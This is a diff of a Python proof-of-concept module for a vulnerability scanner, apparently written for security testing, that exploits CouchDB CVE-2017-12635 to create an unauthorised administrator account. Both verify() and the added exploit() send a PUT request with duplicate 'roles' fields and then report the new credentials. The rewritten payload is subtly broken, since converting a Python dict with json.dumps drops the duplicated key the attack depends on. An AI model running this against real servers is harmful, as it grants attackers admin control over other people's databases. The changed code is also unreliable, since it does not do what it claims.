@@ -2,8 +2,8 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import hashlib
-import uuid
+import random
+import json
 
 class Vuln(ABVuln):
     vuln_id = 'CouchDB_0001'  # 平台漏洞编号，留空
@@ -12,7 +12,8 @@ class Vuln(ABVuln):
     type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2017-11-04'  # 漏洞公布时间
     desc = '''
-        在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
+        在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，
+        导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。
     '''  # 漏洞描述
     ref = 'https://github.com/vulhub/vulhub/tree/master/couchdb/CVE-2017-12635'  # 漏洞来源
     cnvd_id = 'Unkonwn'  # cnvd漏洞编号
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 
 class Poc(ABPoc):
     poc_id = '85967b83-b1b2-4292-819b-4400daa1ff20'
-    author = 'cscan'  # POC编写者
+    author = '47bwy'  # POC编写者
     create_date = '2018-04-28'  # POC创建时间
 
     def __init__(self):
@@ -31,26 +32,25 @@ class Poc(ABPoc):
 
     def verify(self):
         try:
-            #根据data的不同，输出数据也会不同，所以后期再根据系统定制化参数的功能对payload做通用性处理
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            #info = hashlib.md5(str(uuid.uuid1())).hexdigest()
-            #session = requests.session()
+            #生成随机注册信息
+            info = 'admin' + str(random.randint(1,10000))
             headers = {
                 'Content-Type': 'application/json'
             }
-            data='''{
-                  "type": "user",
-                  "name": "csancsan",
-                  "roles": ["_admin"],
-                  "roles": [],
-                  "password": "csancsan"
-                }'''
-
-            r = requests.put(self.target + '/_users/org.couchdb.user:csancsan', data=data, headers=headers)
-            print(r.text)
-            if "csancsa" in r.text:
+            data = {
+                "type": "user",
+                "name": info,
+                "roles": ["_admin"],
+                "roles": [],
+                "password": info
+            }
+            data = json.dumps(data) 
+            url = self.target + '/_users/org.couchdb.user:{admin}'.format(admin=info)
+            r = requests.put(url, data=data, headers=headers)
+            if info in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -58,7 +58,31 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.verify()
+        try:
+            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
+                target=self.target, vuln=self.vuln))
+
+            #生成随机注册信息
+            info = 'admin' + str(random.randint(1,10000))
+            headers = {
+                'Content-Type': 'application/json'
+            }
+            data_dict = {
+                "type": "user",
+                "name": info,
+                "roles": ["_admin"],
+                "roles": [],
+                "password": info
+            }
+            data_json = json.dumps(data_dict) 
+            url = self.target + '/_users/org.couchdb.user:{admin}'.format(admin=info)
+            r = requests.put(url, data=data_json, headers=headers)
+            if info in r.text:
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞，已注册用户:{uname}，密码：{passwd},请及时删除。'.format(
+                    target=self.target, name=self.vuln.name, uname=info, passwd=info))
+
+        except Exception, e:
+            self.output.info('执行异常{}'.format(e))
 
 if __name__ == '__main__':
     Poc().run()
